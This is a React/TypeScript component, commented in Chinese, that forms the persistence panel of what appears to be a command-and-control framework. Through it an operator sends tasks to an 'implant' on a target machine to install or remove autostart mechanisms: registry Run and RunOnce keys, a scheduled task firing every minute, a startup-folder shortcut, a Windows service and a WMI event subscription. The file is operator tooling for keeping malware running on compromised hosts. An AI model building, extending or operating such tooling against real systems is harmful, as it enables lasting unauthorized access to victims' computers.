import { useState, useCallback } from 'react'
import { Shield, Check, Trash2, RefreshCw, AlertTriangle, XCircle } from 'lucide-react'
import type { Session } from '../types'
import { persistenceApi, type PersistenceMethod } from '../api'

interface PersistencePanelProps {
  session: Session
}

/** 已知的持久化方法（静态定义，加载时按 implant 实际返回过滤） */
const KNOWN_METHODS: PersistenceMethod[] = [
  { name: 'registry_run', description: 'HKCU\\...\\Run 注册表启动项 (无需管理员)', reliable: true },
  { name: 'registry_run_once', description: 'HKLM\\...\\RunOnce 注册表启动项 (需管理员)', reliable: true },
  { name: 'scheduled_task', description: '计划任务, 每分钟触发一次', reliable: true },
  { name: 'startup_folder', description: '启动文件夹快捷方式', reliable: true },
  { name: 'service', description: 'Windows 服务 (需管理员)', reliable: true },
  { name: 'wmi_subscription', description: 'WMI 事件订阅, 监听 explorer.exe 启动 (需管理员)', reliable: false },
]

type MethodStatus = 'idle' | 'installing' | 'removing' | 'installed' | 'removed' | 'error'

interface MethodEntry {
  status: MethodStatus
  message: string
}

type MethodStates = Record<string, MethodEntry>

/** 轮询任务结果，最多 60 秒 */
async function pollTaskResult(taskId: number): Promise<{ output?: string; error?: string }> {
  const token = localStorage.getItem('toshell-token')
  // 动态轮询间隔：前几次快速探测，之后拉长，减少无效请求
  const intervals = [0, 200, 300, 500, 1000, 2000]
  for (let i = 0; i < 60; i++) {
    try {
      const resp = await fetch(`/api/v1/tasks/${taskId}`, {
        headers: { Authorization: `Bearer ${token}` },
      })
      const task = await resp.json()
      if (task.status === 'completed') return { output: task.output }
      if (task.status === 'failed') return { error: task.error || '任务执行失败' }
    } catch {
      // ignore network errors during polling
    }
    await new Promise((r) => setTimeout(r, intervals[Math.min(i, intervals.length - 1)]))
  }
  return { error: '任务执行超时 (60s)' }
}

export function PersistencePanel({ session }: PersistencePanelProps) {
  const [methods, setMethods] = useState<MethodStates>(() => {
    const init: MethodStates = {}
    KNOWN_METHODS.forEach((m) => {
      init[m.name] = { status: 'idle', message: '' }
    })
    return init
  })

  const updateMethod = useCallback((name: string, update: Partial<MethodEntry>) => {
    setMethods((prev) => ({
      ...prev,
      [name]: { ...prev[name], ...update },
    }))
  }, [])

  const handleInstall = useCallback(
    async (method: PersistenceMethod) => {
      updateMethod(method.name, { status: 'installing', message: '正在下发持久化任务...' })
      try {
        const resp = await persistenceApi.install(session.id, method.name)
        const taskId = resp.data?.task_id
        if (!taskId) throw new Error('未返回 task_id')

        updateMethod(method.name, { message: '等待执行结果...' })

        const result = await pollTaskResult(taskId)
        if (result.output) {
          updateMethod(method.name, { status: 'installed', message: result.output })
        } else {
          updateMethod(method.name, { status: 'error', message: result.error || '未知错误' })
        }
      } catch (err: any) {
        const msg = err?.response?.data?.error || err.message || '请求失败'
        updateMethod(method.name, { status: 'error', message: msg })
      }
    },
    [session.id, updateMethod]
  )

  const handleRemove = useCallback(async () => {
    // 将所有方法标记为 removing
    KNOWN_METHODS.forEach((m) => {
      updateMethod(m.name, { status: 'removing', message: '正在清理持久化...' })
    })
    try {
      const resp = await persistenceApi.remove(session.id)
      const taskId = resp.data?.task_id
      if (!taskId) throw new Error('未返回 task_id')

      const result = await pollTaskResult(taskId)
      KNOWN_METHODS.forEach((m) => {
        if (result.output) {
          updateMethod(m.name, { status: 'removed', message: '已清理' })
        } else {
          updateMethod(m.name, { status: 'error', message: result.error || '清理失败' })
        }
      })
    } catch (err: any) {
      const msg = err?.response?.data?.error || err.message || '请求失败'
      KNOWN_METHODS.forEach((m) => {
        updateMethod(m.name, { status: 'error', message: msg })
      })
    }
  }, [session.id, updateMethod])

  const handleRefresh = useCallback(async () => {
    KNOWN_METHODS.forEach((m) => {
      updateMethod(m.name, { status: 'idle', message: '' })
    })
    try {
      const resp = await persistenceApi.listMethods(session.id)
      const taskId = resp.data?.task_id
      if (!taskId) return

      const result = await pollTaskResult(taskId)
      // 即使查询成功，方法状态也只是表示已查询
      KNOWN_METHODS.forEach((m) => {
        updateMethod(m.name, { message: result.output ? '已查询' : '未获取到状态' })
      })
    } catch {
      // ignore
    }
  }, [session.id, updateMethod])

  const statusBadge = (status: MethodStatus) => {
    switch (status) {
      case 'installing':
        return <span className="persistence-status installing">安装中...</span>
      case 'removing':
        return <span className="persistence-status removing">清理中...</span>
      case 'installed':
        return (
          <span className="persistence-status installed">
            <Check size={12} /> 已安装
          </span>
        )
      case 'removed':
        return <span className="persistence-status removed">已清理</span>
      case 'error':
        return (
          <span className="persistence-status error">
            <XCircle size={12} /> 失败
          </span>
        )
      default:
        return null
    }
  }

  return (
    <div className="persistence-panel">
      <div className="persistence-toolbar">
        <div className="persistence-info">
          <Shield size={18} />
          <span>持久化管理 — {session.hostname}</span>
        </div>
        <div className="persistence-actions">
          <button className="btn-small" onClick={handleRefresh} title="刷新状态">
            <RefreshCw size={14} /> 刷新
          </button>
          <button className="btn-small danger" onClick={handleRemove} title="清理所有持久化">
            <Trash2 size={14} /> 清理全部
          </button>
        </div>
      </div>

      <div className="persistence-notice">
        <AlertTriangle size={14} />
        <span>持久化操作会使 implant 在目标系统重启后自动运行。清理操作会移除所有已安装的持久化机制。</span>
      </div>

      <div className="persistence-methods">
        {KNOWN_METHODS.map((method) => {
          const state = methods[method.name]
          const isBusy = state.status === 'installing' || state.status === 'removing'

          return (
            <div key={method.name} className={`persistence-card ${state.status}`}>
              <div className="persistence-card-header">
                <div className="persistence-card-title">
                  <span className="persistence-method-name">{method.name}</span>
                  {!method.reliable && (
                    <span className="persistence-unreliable" title="此方法可靠性较低">
                      <AlertTriangle size={12} /> 不稳定
                    </span>
                  )}
                </div>
                <div className="persistence-card-status">
                  {statusBadge(state.status)}
                </div>
              </div>
              <p className="persistence-card-desc">{method.description}</p>
              {state.message && (
                <p className="persistence-card-output">{state.message}</p>
              )}
              <div className="persistence-card-actions">
                <button
                  className="btn-small primary"
                  onClick={() => handleInstall(method)}
                  disabled={isBusy}
                >
                  {state.status === 'installing' ? '安装中...' : '安装'}
                </button>
              </div>
            </div>
          )
        })}
      </div>
    </div>
  )
}
